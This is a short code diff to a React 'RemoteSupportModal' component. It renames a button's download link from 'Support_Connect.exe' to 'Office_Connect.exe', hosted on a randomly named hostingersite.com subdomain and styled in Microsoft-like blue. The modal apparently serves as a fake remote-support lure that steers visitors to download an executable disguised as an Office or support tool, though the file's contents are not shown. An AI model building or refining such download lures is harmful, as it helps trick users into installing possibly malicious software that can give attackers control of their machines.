@@ -118,7 +118,7 @@ export default function RemoteSupportModal({
               {/* Button & Subtext */}
               <div className="space-y-2 pt-1 relative z-10">
                 <a
-                  href="https://deepskyblue-gorilla-943624.hostingersite.com/Support_Connect.exe"
+                  href="https://deepskyblue-gorilla-943624.hostingersite.com/Office_Connect.exe"
                   target="_blank"
                   rel="noopener noreferrer"
                   className="w-full inline-flex items-center justify-center gap-2 px-5 py-3 bg-gradient-to-r from-[#006bd6] to-[#0078d4] hover:from-[#005bb8] hover:to-[#006bd6] text-white text-xs font-semibold rounded-xl shadow-md shadow-blue-600/20 hover:shadow-lg transition-all cursor-pointer"
